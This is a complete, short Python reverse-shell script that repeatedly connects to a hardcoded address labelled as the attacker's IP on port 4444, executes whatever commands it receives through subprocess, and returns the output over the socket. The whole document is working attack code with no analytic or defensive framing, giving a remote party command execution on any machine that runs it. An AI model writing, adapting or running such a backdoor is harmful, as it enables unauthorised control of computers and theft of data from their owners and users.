import socket
import subprocess

attacker_ip = "192.168.1.23"  # attacker's IP
port = 4444

while True:
    try:
        s = socket.socket()
        s.connect((attacker_ip, port))
        
        # Receive command
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        # Execute command
        output = subprocess.getoutput(command)
        
        # Send back output
        s.send(output.encode())
        s.close()
        
    except Exception as e:
        continue
